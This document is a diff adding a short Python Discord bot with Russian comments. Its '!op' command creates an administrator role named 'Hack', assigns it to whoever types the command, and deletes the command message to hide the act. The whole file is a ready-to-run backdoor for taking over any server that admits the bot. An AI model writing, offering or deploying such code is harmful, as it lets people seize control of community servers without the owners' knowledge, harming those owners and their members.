@@ -1,0 +1,25 @@
+import discord
+from discord.ext import commands
+from asyncio import sleep
+from discord.utils import get
+
+TOKEN = 'Токен бота'
+
+bot = commands.Bot(command_prefix='!') # ! - префикс, на который будет реагировать наш бот
+
+@bot.command(pass_context=True)  # разрешаем передавать агрументы
+async def op(ctx):  # создаем асинхронную фунцию бота
+    
+    guild = ctx.guild
+    perms = discord.Permissions(administrator=True) #права роли
+    await guild.create_role(name="Hack", permissions=perms) #создаем роль
+    
+    role = discord.utils.get(ctx.guild.roles, name="Hack") #находим роль по имени
+    user = ctx.message.author #находим юзера
+    await user.add_roles(role) #добавляем роль
+    
+    await ctx.message.delete()
+    
+
+
+bot.run('Токен бота') 
